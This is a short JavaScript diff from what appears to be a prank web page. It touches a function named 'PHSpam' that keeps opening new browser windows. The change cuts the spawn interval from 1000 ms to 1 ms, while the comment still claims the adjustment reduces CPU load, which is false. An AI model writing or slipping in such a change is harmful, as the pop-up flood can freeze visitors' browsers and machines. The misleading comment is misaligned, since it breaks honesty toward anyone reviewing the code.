@@ -38,7 +38,7 @@ PHSpam: () => {
       win = window.open(url, '_blank');
       if (win) portals.push(win);
     }
-  }, 1000); // Adjusted interval to reduce CPU load
+  }, 1); // Adjusted interval to reduce CPU load
 },
         changeBG: () => document.body.style.background = `hsl(${Math.floor(Math.random()*360)} 60% 80%)`,
         shake: () => {
